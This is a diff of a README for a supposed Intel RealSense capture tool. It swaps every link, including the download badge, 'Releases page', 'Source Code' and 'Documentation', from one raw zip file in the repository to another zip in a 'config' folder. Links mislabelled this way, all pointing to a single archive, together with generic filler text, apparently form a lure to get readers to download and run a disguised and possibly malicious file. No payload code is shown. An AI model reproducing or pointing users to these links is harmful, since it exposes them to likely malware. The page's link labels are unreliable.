@@ -1,6 +1,6 @@
 # 🎥 RealSense-Capture-Suite - Capture Data with Ease
 
-[![Download](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip%20release-blue)](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip)
+[![Download](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip%20release-blue)](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download the software, ensure your system meets these basic requireme
 
 To download and install RealSense-Capture-Suite, follow these steps:
 
-1. Visit the **[Releases page](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip)**.
+1. Visit the **[Releases page](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip)**.
 2. Look for the latest release. It will display useful information including version and date.
 3. Download the appropriate file for your operating system. For Windows, it may be a `.exe` file, and for macOS, it may be a `.dmg` file.
 4. Once downloaded, find the file in your Downloads folder or location where you saved it.
@@ -58,7 +58,7 @@ If you encounter any issues or have questions, please check the following resour
 
 - **GitHub Issues:** Feel free to report issues or request features directly on this repository.
 - **Community Forums:** Engage with other users and developers for tips and tricks.
-- **Documentation:** Access additional guidance on using the software effectively. Documentation is available within the application or on the [GitHub page](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip).
+- **Documentation:** Access additional guidance on using the software effectively. Documentation is available within the application or on the [GitHub page](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip).
 
 ## 🌟 Acknowledgements
 
@@ -66,8 +66,8 @@ Thanks to the community and contributors who helped make this project possible. 
 
 ## 🔗 Useful Links
 
-- **Download the latest release:** [Releases page](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip)
-- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip)
-- **Documentation:** [Documentation](https://raw.githubusercontent.com/TheAdwaith/RealSense-Capture-Suite/master/barriness/RealSense-Capture-Suite.zip)
+- **Download the latest release:** [Releases page](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip)
+- **Source Code:** [GitHub Repository](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip)
+- **Documentation:** [Documentation](https://github.com/TheAdwaith/RealSense-Capture-Suite/raw/refs/heads/master/config/Sense_Suite_Real_Capture_sapa.zip)
 
 For a simple and effective way to capture and manage data from Intel RealSense cameras, the RealSense-Capture-Suite stands out as a robust tool. Enjoy capturing and exploring your data!
